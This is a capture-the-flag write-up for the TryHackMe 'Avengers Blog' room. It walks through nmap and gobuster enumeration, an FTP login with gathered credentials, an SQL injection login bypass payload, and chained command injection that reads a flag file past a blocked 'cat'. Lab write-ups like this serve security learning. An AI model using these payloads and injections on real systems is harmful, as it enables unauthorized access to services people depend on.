# Avengers Blog Write Up
https://tryhackme.com/room/avengers


### Task 1 Deploy

Deploy the vm and connect with openvpn.

### Task 2 Cookies

Navigate to the web server running on the machine in your browser and right-click and choose 'Inspect Element' if using Firefox. Click the storage tab to look at cookies in your browser. View the value of the flag1 cookie.

### Task 3 HTTP Headers

Staying in developer tools, go to the network tab and click on the first request made "/". In Firefox you can view the header information on the right side of the developer tools. View the section under "Response Headers" and flag2 will be one of the response headers.

### Task 4 Enumeration and FTP

```
nmap -sC -sV -v -A 10.10.31.84
```
We start by running a port scan on the target. I like to use -sV as it probes for versions and -A as it gives us more information about the OS, versions, runs scripts, and traceroute.

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a7:1c:5c:b9:a3:17:38:eb:2b:3b:d8:a4:22:bc:01:b8 (RSA)
|   256 3b:c4:2a:b4:8e:2a:58:70:5b:6f:30:7e:0a:b4:c6:44 (ECDSA)
|_  256 0e:fc:ac:89:85:3f:6f:44:ef:bc:40:d7:cf:c0:ba:f2 (ED25519)
80/tcp open  http    Node.js Express framework
|_http-favicon: Unknown favicon MD5: E084507EB6547A72F9CEC12E0A9B7A36
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Avengers! Assemble!
```
From our scan we see that ftp is running on the victim, so lets check that out.

```
# ftp 10.10.31.84
Connected to 10.10.31.84.
220 (vsFTPd 3.0.3)
Name (10.10.31.84:cornbread): groot
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```
Using the ftp command and supplying a username and password we gathered from our reconnaissance of the website we authenticate into the ftp server. It looks like there is a directory 'files' and inside we find flag3.txt which we can grab.
```
ftp> get flag3.txt
```

### Task 5 GoBuster

```
# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.31.84/
```
After running gobuster for about 1 minute we find a bunch of directories but the one we are looking for is the login page '/portal'.

```
===============================================================
/img                  (Status: 301) [Size: 173] [--> /img/]
/home                 (Status: 302) [Size: 23] [--> /]     
/Home                 (Status: 302) [Size: 23] [--> /]     
/assets               (Status: 301) [Size: 179] [--> /assets/]
/portal               (Status: 200) [Size: 1409]              
/css                  (Status: 301) [Size: 173] [--> /css/]   
/js                   (Status: 301) [Size: 171] [--> /js/]    
/logout               (Status: 302) [Size: 29] [--> /portal]  
/Portal               (Status: 200) [Size: 1409]
```

### Task 6 SQL Injection

Go to the portal page and we are presented with a simple login page. In this case we know its vulnerable to SQLi and there are a variety of different payloads you can try but we'll just go with a simple:
```
' or 1=1-- '
```
Boom! Putting this in the username and password field seems to work as we are authenticated and redirected to Jarvis Control Panel at '/home'. In Firefox we can right click and 'View Page Source' then look on the left hand side to read the lines of code for the answer.

### Task 7 Remote Code Execution and Linux

We have a command line where we can seemingly run certain commands. So lets try ls.
This gives us the current directory so we can try to navigate the file system for the flag. Going back one directory we see flag5.txt.
```
cd ../; ls; cat flag5.txt
```
After trying this we are not allowed to use cat and are told to use a different method of displaying the file. TryHackMe wants you to use tac but I used less. Both will return the same output in this situation.

```
cd ../; ls; less flag5.txt
```


